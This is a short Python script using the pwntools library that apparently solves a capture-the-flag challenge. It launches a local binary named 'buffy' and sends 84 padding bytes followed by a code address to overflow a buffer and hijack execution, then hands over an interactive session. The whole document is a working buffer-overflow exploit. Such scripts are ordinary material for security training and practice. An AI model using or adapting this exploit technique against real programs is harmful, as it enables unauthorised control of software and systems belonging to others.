#!/usr/bin/python3

from pwn import *

context.binary = './buffy'


target = process('./buffy')

target.recvuntil(b'input:')

payload = b'\x00' * 84 + p32(0x080491a6)

target.sendline(payload)

target.interactive()